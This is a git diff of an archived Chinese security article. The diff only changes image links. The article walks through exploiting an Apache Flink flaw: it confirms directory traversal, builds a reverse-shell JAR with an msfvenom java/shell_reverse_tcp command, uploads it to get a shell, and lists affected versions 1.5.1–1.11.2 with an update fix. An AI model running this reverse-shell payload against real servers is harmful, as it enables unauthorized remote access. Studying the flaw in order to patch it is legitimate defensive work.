@@ -49,7 +49,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/58QhVM_Kp-ds-HD4YRESwg)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa24HxVPpEqNSlEFXwdZ68buwytSlQpLr8yLOYEVQOqlwBKsBWYfkkMo4ywKoFErSicJh0qzTuseSdsA/640?wx_fmt=jpeg)
+![](../../.resource/remote/8bc07b75bb9329d895df3f8ef1c7b79926b9be4687542b6f3a82289d0b78cfef.jpg)
 
 **前言:**  
 
@@ -63,11 +63,11 @@ Apache Flink 前面写了它存在目录遍历漏洞，今天和大家分享一�
 
 写入文件。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26QBWOcswEfX6cr6eJmkNFjicM5teCnCN9n7eR1SS8ApiatytMHeptiaibOicf7ZWpibbArk6f641fibC5eA/640?wx_fmt=png)
+![](../../.resource/remote/8d10c72ca3fc1b0236435e0d2c32d09bc799ec1274a30a8fa3823af67fc30b29.png)
 
 通过目录遍历漏洞读取写入的文件, 返回文件内容。漏洞存在。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26QBWOcswEfX6cr6eJmkNFjA4icUosLCmbw5jrPNS0F41nwxmc6lojSNxXv1WymxPYBTfxRI1gfo1w/640?wx_fmt=png)
+![](../../.resource/remote/c2ea5f15da67da29d04dac22edbc93d6c6cd74c02b3f613c49aa900ae03fc636.png)
 
 编写 shell 利用 Metasploit 框架 msfvenom 来生成木马。
 
@@ -78,13 +78,13 @@ msfconsole
 msfvenom -p java/shell_reverse_tcp lhost=ip  lport=port -f jar >/gem.jar
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26QBWOcswEfX6cr6eJmkNFj6XialYWZExu4hah5fFP9PUl9NQYF4KYmibPrheic2RUyQFIQ6P148ACkQ/640?wx_fmt=png)
+![](../../.resource/remote/914235c0f45077d0d44d358c75acf9616d7b42b1f4ef2e25b1ca948d8d88cd4c.png)
 
 上传成功成功反弹 shell。  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26QBWOcswEfX6cr6eJmkNFjIOY5VIqagIPX6wKBy27f4huItZkvibsBAYfz43tOOoLuBC62UU46qDg/640?wx_fmt=png)
+![](../../.resource/remote/040987e3128b037fa2d924454e0465d1952f99f2718f2f0cc18fb5416f7d8c29.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26QBWOcswEfX6cr6eJmkNFjUlMNH8M6WvyYGKqIx8BFfnb8ibAPeAONJwdCEnIbDOEDy4e3dA9TQHQ/640?wx_fmt=png)
+![](../../.resource/remote/1be703135ca688dd1fdcb88d452db6e081466715e99f8bba0c7b2a49f8dff00e.png)
 
 **影响版本:**
 
@@ -94,9 +94,9 @@ Apache Flink 1.5.1 ~ 1.11.2
 
 及时更新到最新版本。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)
+![](../../.resource/remote/221591930eed440bd20e1f3a48fe3a6955668851ff4b7e625c88e0b79c3b4d4d.jpg)
 
-一起学习，请关注我![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24an9TvS6grA3sWoTRYSQr4hZQYrCwcz8gD1evatvHgAquT3YhfNMxgqib63eQ1mRnQVjQA6W9icxFg/640?wx_fmt=png)
+一起学习，请关注我![](../../.resource/remote/33ed3313c169926038b31e08c29cc323ec78682054867d009cd87d360f94912d.png)
 
 免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!
 
